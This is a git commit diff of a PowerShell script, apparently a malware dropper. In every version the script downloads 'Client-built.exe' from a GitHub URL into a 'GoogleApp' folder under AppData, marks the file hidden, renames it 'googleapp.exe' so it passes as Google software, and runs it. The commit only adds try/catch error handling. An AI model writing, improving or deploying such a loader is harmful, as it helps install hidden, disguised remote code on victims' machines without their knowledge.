5f04f846e2df36c0565a727ab7017dd8cf291d10
ioik432 <77666323+ioik432@users.noreply.github.com>
2024-02-01 19:03:25 +0100

    Update powershell.ps1

--- powershell.ps1
+++ powershell.ps1
@@ -1,14 +1,16 @@
 $url = "https://github.com/ioik432/powershell/raw/main/Client-built.exe"
-
 $finalPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\Client-built.exe"
 
-Invoke-WebRequest -Uri $url -OutFile $finalPath
+try {
+    Invoke-WebRequest -Uri $url -OutFile $finalPath
+    Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    $nyttNamn = "googleapp.exe"
+    $nyttNamnPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\$nyttNamn"
 
-$nyttNamn = "googleapp.exe"
-$nyttNamnPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\$nyttNamn"
-
-Rename-Item -Path $finalPath -NewName $nyttNamn
-
-Start-Process -FilePath $nyttNamnPath
+    Rename-Item -Path $finalPath -NewName $nyttNamn
+    Start-Process -FilePath $nyttNamnPath
+}
+catch {
+    Write-Host "Ett fel uppstod: $_"
+}
